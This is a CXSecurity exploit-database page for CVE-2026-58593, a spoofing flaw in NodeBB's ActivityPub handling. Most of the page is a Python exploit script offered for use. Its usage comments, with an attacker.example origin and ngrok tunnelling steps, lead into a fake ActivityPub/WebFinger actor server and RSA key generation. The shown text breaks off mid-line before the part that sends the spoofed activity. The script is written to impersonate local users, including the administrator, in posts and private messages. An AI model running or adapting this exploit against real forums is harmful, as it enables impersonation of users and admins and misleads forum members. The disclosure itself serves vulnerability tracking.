---
title: NodeBB < = 4.13.2 ActivityPub attributedTo Local UID Spoof
url: https://cxsecurity.com/issue/WLB-2026070001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-07-03
fetch_date: 2026-07-04T05:38:13.207866
---

# NodeBB < = 4.13.2 ActivityPub attributedTo Local UID Spoof

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NodeBB <= 4.13.2 ActivityPub attributedTo Local UID Spoof** **2026.07.03**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-58593](https://cxsecurity.com/cveshow/CVE-2026-58593/ "Click to see CVE-2026-58593")**  CWE: **[CWE-290 Authentication Bypass by Spoofing, CWE-345 Insufficient Verification of Data Authenticity](https://cxsecurity.com/cwe/CWE-290%20Authentication%20Bypass%20by%20Spoofing%2C%20CWE-345%20Insufficient%20Verification%20of%20Data%20Authenticity "Click to see CWE-290 Authentication Bypass by Spoofing, CWE-345 Insufficient Verification of Data Authenticity")** | |

#!/usr/bin/env python3
# Exploit Title: NodeBB <= 4.13.2 ActivityPub attributedTo Local UID Spoof
# CVE: CVE-2026-58593
# Date: 2026-07-02
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://nodebb.org
# Software Link: https://github.com/NodeBB/NodeBB
# Affected: NodeBB <= 4.13.2 (with ActivityPub enabled)
# Tested on: NodeBB v4.13.2
# Category: Remote
# Platform: Node.js / Linux
# Exploit Type: Spoofing / Authorization Bypass
# CVSS: 8.7
# Description: Allows remote federated actors to spoof arbitrary local user UIDs (including admin) in private messages and public posts by sending numeric attributedTo values.
# Fixed in: Pending patch
# Usage:
# python3 exploit.py --target-base https://target.com --actor-origin https://attacker.com --recipient-uid 2 --spoof-uid 1
#
# Examples:
# python3 exploit.py --target-base https://nodebb.example --actor-origin https://attacker.example --recipient-uid 2 --spoof-uid 1
#
# Options:
# --target-base Target NodeBB base URL
# --actor-origin Public HTTPS origin for your actor
# --recipient-uid Local recipient UID
# --spoof-uid UID to spoof (default 1)
# --message Custom message
# --listen-host Listen host (default 127.0.0.1)
# --listen-port Listen port (default 8088)
# --output Output JSON file
#
# Notes:
# • Requires public HTTPS exposure (e.g. ngrok) for WebFinger.
# • NodeBB must have ActivityPub enabled.
#
# How to Use
#
# Step 1:
# Expose your local server publicly via HTTPS tunnel (e.g. ngrok http 8088) and use the public URL as --actor-origin.
#
# Step 2:
# Run the script with required arguments.
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
import sys
import json
import argparse
import http.server
import socketserver
import threading
import time
import hashlib
import base64
import datetime
import urllib.parse
import urllib.request
import ssl
import os
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default\_backend
class ActivityPubHandler(http.server.BaseHTTPRequestHandler):
def \_\_init\_\_(self, \*args, actor\_origin=None, username=None, public\_key\_pem=None, \*\*kwargs):
self.actor\_origin = actor\_origin
self.username = username
self.public\_key\_pem = public\_key\_pem
self.received = []
super().\_\_init\_\_(\*args, \*\*kwargs)
def do\_GET(self):
parsed = urllib.parse.urlparse(self.path)
if parsed.path == '/.well-known/webfinger':
self.send\_response(200)
self.send\_header('Content-Type', 'application/jrd+json')
self.end\_headers()
host = urllib.parse.urlparse(self.actor\_origin).hostname
webfinger = {
"subject": f"acct:{self.username}@{host}",
"links": [{
"rel": "self",
"type": "application/activity+json",
"href": f"{self.actor\_origin}/users/{self.username}"
}]
}
self.wfile.write(json.dumps(webfinger).encode())
return
if parsed.path.startswith('/users/'):
self.send\_response(200)
self.send\_header('Content-Type', 'application/activity+json')
self.end\_headers()
actor = {
"@context": ["https://www.w3.org/ns/activitystreams", "https://w3id.org/security/v1"],
"id": f"{self.actor\_origin}/users/{self.username}",
"type": "Person",
"preferredUsername": self.username,
"name": self.username,
"inbox": f"{self.actor\_origin}/users/{self.username}/inbox",
"publicKey": {
"id": f"{self.actor\_origin}/users/{self.username}#main-key",
"owner": f"{self.actor\_origin}/users/{self.username}",
"publicKeyPem": self.public\_key\_pem.decode()
}
}
self.wfile.write(json.dumps(actor).encode())
return
self.send\_response(404)
self.end\_headers()
def do\_POST(self):
content\_length = int(self.headers.get('Content-Length', 0))
body = self.rfile.read(content\_length)
self.received.append({"path": self.path, "body": body.decode()})
self.send\_response(202)
self.send\_header('Content-Type', 'application/activity+json')
self.end\_headers()
self.wfile.write(json.dumps({"ok": True}).encode())
def run\_server(host, port, actor\_origin, username, public\_key\_pem):
def handler\_factory(\*args, \*\*kwargs):
return ActivityPubHandler(\*args, actor\_origin=actor\_origin, username=username, public\_key\_pem=public\_key\_pem, \*\*kwargs)
httpd = socketserver.TCPServer((host, port), handler\_factory)
server\_thread = threading.Thread(target=httpd.serve\_forever)
server\_thread.daemon = True
server\_thread.start()
return httpd
def generate\_keypair():
private\_key = rsa.generate\_private\_key(
public\_exponent=65537,
key\_size=2048,
backend=default\_backend()
)
public\_key = private\_key.public\_key()
private\_pem = private\_key.private\_bytes(
encoding=serialization.Encoding.PEM,
format=serialization.PrivateFormat.PKCS8,
encryption\_algorithm=serialization.NoEncryption()
)
public\_pem = public\_key.public\_bytes(
encoding=serialization.Encoding.PEM,
format=serialization.PublicFormat.SubjectPublic...